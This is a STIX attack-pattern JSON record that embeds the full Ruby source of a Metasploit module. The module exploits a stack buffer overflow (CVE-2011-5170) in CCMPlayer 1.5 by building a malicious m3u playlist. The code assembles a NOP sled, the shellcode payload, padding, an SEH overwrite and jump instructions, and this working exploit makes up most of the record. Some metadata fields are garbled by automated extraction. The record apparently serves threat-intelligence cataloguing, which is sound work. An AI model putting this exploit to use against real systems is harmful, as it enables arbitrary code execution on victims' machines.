{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ad058a2-93de-42a0-ad8b-3b0c11423f95",
    "created": "2024-08-14T16:35:51.645271Z",
    "modified": "2024-08-14T16:35:51.645275Z",
    "name": "CCMPlayer 1.5 m3u Playlist Stack Based Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in CCMPlayer 1.5. Opening a m3u playlist with a long track name, a SEH exception record can be overwritten with parts of the controllable buffer. SEH execution is triggered after an invalid read of an injectable address, thus allowing arbitrary code execution. This module works on multiple Windows platforms including: Windows XP SP3 Windows Vista, and Windows 7.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ccmplayer_m3u_bof.rb",
            "external_id": "ccmplayer_m3u_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5170"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CCMPlayer 1.5 m3u Playlist Stack Based Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in CCMPlayer 1.5. Opening\n        a m3u playlist with a long track name, a SEH exception record can be overwritten\n        with parts of the controllable buffer. SEH execution is triggered after an\n        invalid read of an injectable address, thus allowing arbitrary code execution.\n        This module works on multiple Windows platforms including: Windows XP SP3,\n        Windows Vista, and Windows 7.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => ['Rh0'],\t# discovery and metasploit module\n      'References'     =>\n        [\n          ['CVE', '2011-5170'],\n          ['OSVDB', '77453'],\n          ['EDB', '18178']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space' => 0x1000,\n          'BadChars' => \"\\x00\\x0d\\x0a\\x1a\\x2c\\x2e\\x3a\\x5c\", # \\x00\\r\\n\\x1a,.:\\\\\n          'DisableNops' => 'True',\n          'StackAdjustment' => -3500,\n        },\n      'Platform'\t\t=> 'win',\n      'Targets'\t\t=>\n        [\n          [\n            'CCMPlayer 1.5',\n            {\n              # pop esi / pop ebx / ret (in ccmplay.exe)\n              # tweak it if necessary\n              'Ret' => 0x00403ca7,\t# last NULL in buffer is accepted\n              'Offset' => 0x1000\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-11-30', # to my knowledge\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The file name.',  'msf.m3u']),\n        ])\n  end\n\n  def exploit\n\n    m3u = \"C:\\\\\"\n    # shellcode\n    m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"nop\").encode_string * 25\n    m3u << payload.encoded\n    # junk\n    m3u << rand_text_alpha_upper(target['Offset'] - (25 + payload.encoded.length))\n    # need an access violation when reading next 4 bytes as address (0xFFFFFFFF)\n    # to trigger SEH\n    m3u << [0xffffffff].pack(\"V\")\n    # pad\n    m3u << rand_text_alpha_upper(3)\n    # long jmp: jmp far back to shellcode\n    m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-4103\").encode_string\n    # NSEH: jmp short back to long jmp instruction\n    m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-5\").encode_string\n    # pad (need more 2 bytes to fill up to 4, as jmp $-5 are only 2 bytes)\n    m3u << rand_text_alpha_upper(2)\n    # SEH Exception Handler Address -> p/p/r\n    m3u << [target.ret].pack(\"V\")\n    m3u << \".mp3\\r\\n\"\t# no crash without it\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    # Open CCMPlayer -> Songs -> Add -> Files of type: m3u -> msf.m3u => exploit\n    file_create(m3u)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-30, # to my knowledge",
    "x_mitre_platforms": [
        "win'"
    ]
}